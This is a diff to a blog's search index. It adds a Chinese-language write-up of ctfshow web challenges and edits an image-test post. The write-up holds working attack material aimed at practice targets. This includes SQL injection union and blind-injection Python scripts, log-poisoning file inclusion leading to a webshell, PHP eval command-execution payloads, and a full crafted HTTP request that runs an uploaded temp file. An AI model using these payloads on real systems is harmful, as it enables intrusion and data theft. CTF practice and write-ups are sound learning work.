@@ -54,7 +54,7 @@
     <url>/2025/10/08/picgo-test/</url>
     <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/640.jpg"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/640%20(1).jpg"></p>
-<p>下面是通过typora上传的:</p>
+<p>下面的图是通过typora上传的:</p>
 <p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/%E7%94%B5%E6%A3%8D.jpg" alt="电棍"></p>
 ]]></content>
       <categories>
@@ -62,6 +62,124 @@
       </categories>
       <tags>
         <tag>test</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow-web题</title>
+    <url>/2025/11/19/ctfshow-web%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="CTFSHOW-WEB题"><a href="#CTFSHOW-WEB题" class="headerlink" title="CTFSHOW WEB题"></a>CTFSHOW WEB题</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p>F12看源代码，发现<code> Y3Rmc2hvd3tiMDUyYTQ0ZS04MWEyLTRhNWYtYjkyYS1lNDhjNzQ0YWJlOWR9</code> ,通过base64解码得到flag</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;cat ctf_go_go_go&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><a href="https://blog.csdn.net/Myon5/article/details/133675614">参考</a></p>
+<p>先<code>/?url=/etc/passwd</code></p>
+<p>尝试php伪协议，回显error</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117221048667.png" alt="image-20251117221048667"></p>
+<p>提示信息：日志注入 文件包含</p>
+<p>尝试读取日志：<code>?url=/var/log/nginx/access.log</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223214263.png"></p>
+<p>修改UA</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223443953.png" alt="image-20251117223443953"></p>
+<p>登录蚁剑</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223510010.png" alt="image-20251117223510010"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251117223536153.png" alt="image-20251117223536153"></p>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>php md5弱类型比较</p>
+<p>ctype_alpha要求v1是纯字母</p>
+<p>is_numeric要求v2是数字</p>
+<p> 一些md5值以0e开头的字符串：</p>
+<ul>
+<li>QNKCDZO</li>
+<li>240610708</li>
+<li>s878926199a</li>
+<li>s155964671a</li>
+<li>s21587387a</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118101053704.png" alt="image-20251118101053704"></p>
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>先用<code>&#39; or 1=1 #</code>测试，返回sql inject error</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104035834.png" alt="image-20251118104035834"></p>
+<p>输入<code>&#39; </code>发现空格被过滤</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104221741.png" alt="image-20251118104221741"></p>
+<p>用&#x2F;**&#x2F;代替空格绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104957833.png" alt="image-20251118104957833"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or/**/1=1/**/order/**/by/**/3#</span><br><span class="line"></span><br><span class="line">&#x27;or/**/1=1/**/union/**/select/**/1,2,3#</span><br><span class="line"></span><br><span class="line">&#x27;or/**/1=1/**/union/**/select/**/1,database(),3#</span><br><span class="line"></span><br><span class="line">&#x27;or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web2&#x27;#</span><br><span class="line"></span><br><span class="line">&#x27;or/**/1=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/web2.flag#</span><br></pre></td></tr></table></figure>
+
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1/**/order/**/by/**/3#</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,2,3#</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,database(),3#</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web7&#x27;),3#</span><br><span class="line">//这里注入发现报错无回显</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br><span class="line">//换成双引号，查到表名</span><br><span class="line"></span><br><span class="line">?id=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/web7.flag#</span><br></pre></td></tr></table></figure>
+
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p><a href="https://ctf.show/writeups/1549929">参考</a></p>
+<p>过滤字符</p>
+<ul>
+<li><code>and</code></li>
+<li><code>union</code>   &#x2F;&#x2F; select查询的结果集无法在页面回显</li>
+<li><code>or</code></li>
+<li>空格  &#x2F;&#x2F; 可用&#x2F;**&#x2F;替代</li>
+<li>……</li>
+</ul>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://xxxxxxxxxx.challenge.ctf.show/index.php?id=-1&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for num in range(1,60):</span><br><span class="line">    l = 33</span><br><span class="line">    r = 130</span><br><span class="line">    mid = (l+r)&gt;&gt;1</span><br><span class="line">    while l&lt;r:</span><br><span class="line">        # 数据库：web8</span><br><span class="line">        # sql = &quot;ascii(substr((select/**/database())/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;&quot;.format(num,mid)</span><br><span class="line">        # 表：flag,page,user</span><br><span class="line">        # sql = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;&quot;.format(num,mid)</span><br><span class="line">        # 列：flag</span><br><span class="line">        # sql = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;&quot;.format(num,mid)</span><br><span class="line">        # ctfshow&#123;b54332e2-57d2-47c4-933a-d455e9b7e950&#125;</span><br><span class="line">        sql = &quot;ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;&quot;.format(num,mid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payload = url + &quot;/**/||/**/&quot; + sql</span><br><span class="line"></span><br><span class="line">        # print(payload)</span><br><span class="line"></span><br><span class="line">        res = requests.get(payload)</span><br><span class="line">        </span><br><span class="line">        if &#x27;If&#x27; in res.text:</span><br><span class="line">            l = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;1</span><br><span class="line">    if chr(mid)==&quot; &quot;:</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>二分法:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://xxxxxxxxxxxxxxx.challenge.ctf.show/index.php?id=-1&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(mid, num):</span><br><span class="line">    sql = &quot;/**/||/**/ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;:d&#125;/**/for/**/1))&lt;=&#123;:d&#125;&quot;.format(num,mid)</span><br><span class="line">    payload = url + sql</span><br><span class="line">    res = requests.get(payload)</span><br><span class="line">    return &#x27;If&#x27; in res.text</span><br><span class="line"></span><br><span class="line">def bsearch(l, r, num):</span><br><span class="line">    while l &lt; r:</span><br><span class="line">        mid = (l + r) &gt;&gt; 1</span><br><span class="line">        if check(mid, num): r = mid    # check()判断mid是否满足性质</span><br><span class="line">        else: l = mid + 1</span><br><span class="line">    return l</span><br><span class="line"></span><br><span class="line">for num in range(1, 60):</span><br><span class="line">    l = 33</span><br><span class="line">    r = 130</span><br><span class="line">    res = bsearch(l, r, num)</span><br><span class="line">    if chr(res) == &quot;!&quot;:</span><br><span class="line">        break</span><br><span class="line">    flag += chr(res)</span><br><span class="line">    print(f&#x27;第&#123;num&#125;次遍历结果:&#123;flag&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><code>substr()</code>：截取单个字符</p>
+<p><code>ascii()</code>：转换为 ASCII 码</p>
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>dirsearch扫描</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132236761.png" alt="image-20251118132236761"></p>
+<p>打开robots.txt发现index.phps文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132439610.png" alt="image-20251118132439610"></p>
+<p>payload：<code>ffifdyop</code></p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>点取消得到源码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118133800784.png" alt="image-20251118133800784"></p>
+<p>由源码可知，<code>select、from、where、join、sleep、and、空格、union、,</code>被过滤了</p>
+<p>payload：<code>&#39;or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#</code></p>
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>password为空，把cookie删掉</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118213819661.png" alt="image-20251118213819661"></p>
+<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>查看源码发现提示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118220156878.png" alt="image-20251118220156878"></p>
+<p><code>?cmd=phpinfo();</code> 发现一堆函数被禁用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118221516632.png" alt="image-20251118221516632"></p>
+<p><code>?cmd=print_r(glob(&#39;*&#39;));</code>查看一下目录文件</p>
+<p><code>?cmd=highlight_file(&#39;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#39;);</code>查看文件得到flag</p>
+<h2 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h2><p><a href="https://ctf.show/writeups/1826091">参考1</a> <a href="https://blog.csdn.net/Ethan552525/article/details/118459568">参考2</a></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_红包题&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_红包题&lt;/h2&gt;</span><br><span class="line">    &lt;h4&gt;where is the flag?&lt;/h4&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    &lt;!-- hint:?cmd= --&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">            $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;</span><br><span class="line">            </span><br><span class="line">                die(&quot;cerror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;,$cmd))&#123;</span><br><span class="line">                die(&quot;serror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($cmd);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>PHP上传机制：</p>
+<p>在php中，使用<code>Content-Type: multipart/form-data;</code>上传文件时，会将它保存在临时文件中，在php的配置中<code>upload_tmp_dir</code>参数为保存临时文件的路经，linux下面默认为<code>/tmp</code>。也就是说只要php接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且php每次创建的临时文件名都有固定的格式，为phpXXXX.tmp（Windows中）、php**.tmp（Linux中）。</p>
+</li>
+<li><p>PHP中反引号作用：在php里面反引号里面的内容会被当做shell命令被执行。例如<?php echo`whoami`; ?> 会直接当作命令执行</p>
+</li>
+<li><p><code>.</code>号相当于<code>source</code>命令，这个命令可以直接把文件内容当作命令执行，相当于把文件直接当作shell脚本执行</p>
+</li>
+<li><p><code>&lt;?=</code>相当于<code>&lt;?php ehco</code>的简写版</p>
+</li>
+<li><p><code>?</code>相当于字符的通配符</p>
+</li>
+<li><p>payload构造</p>
+<blockquote>
+<p>&#x2F;?cmd&#x3D;?&gt;&lt;?&#x3D;<code>.+/??p/p?p??????</code>;</p>
+</blockquote>
+<p><code>?&gt;</code>：闭合前面的<code>&lt;?php</code>命令</p>
+<p><code>&lt;?=</code>：相当于<code>&lt;?php echo</code></p>
+<p>反引号:执行命令</p>
+<p><code>.</code>相当于<code>source</code>命令</p>
+<p><code>+</code>：相当于空格</p>
+<p><code>?</code>：文字通配符，负责执行上传的临时文件   &#x2F;??p&#x2F;p?p??????匹配&#x2F;tmp&#x2F;phpxxxxxx</p>
+</li>
+<li><p>构造数据包</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br><span class="line">Host: 6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Google Chrome&quot;;v=&quot;138&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://6d22af06-d619-447d-a81b-425a21e9ccb5.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line">Content-Length: 243</span><br><span class="line"></span><br><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">cat /flag.txt</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>Content-Type有两个值</code>:<br>①application&#x2F;x-www-form-urlencoded(默认值) ：上传键值对<br>②multipart&#x2F;form-data：上传文件</p>
+<p><code>boundary=</code>:boundary定义边界符  <strong>multipart&#x2F;form-data 格式的分隔符</strong>，核心作用是<strong>区分上传的多个表单数据块（如文件、普通表单字段）</strong>，避免不同数据内容混淆。</p>
+<p>文件开始标记：—————————–10242300956292313528205888<br>文件结束标记：—————————–10242300956292313528205888–<br>其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。</p>
+<p><code>#! /bin/bash</code>#! &#x2F;bin&#x2F;sh 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：sh,csh,ksh,tcsh</p>
+<p><code>cat ../../../flag.txt</code>执行命令得到flag（在这之前先逐次执行<code>ls</code>命令，不断返回上一层，查找flag.txt的位置）</p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235305477.png" alt="image-20251118235305477"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235342177.png" alt="image-20251118235342177"></p>
+]]></content>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
 </search>
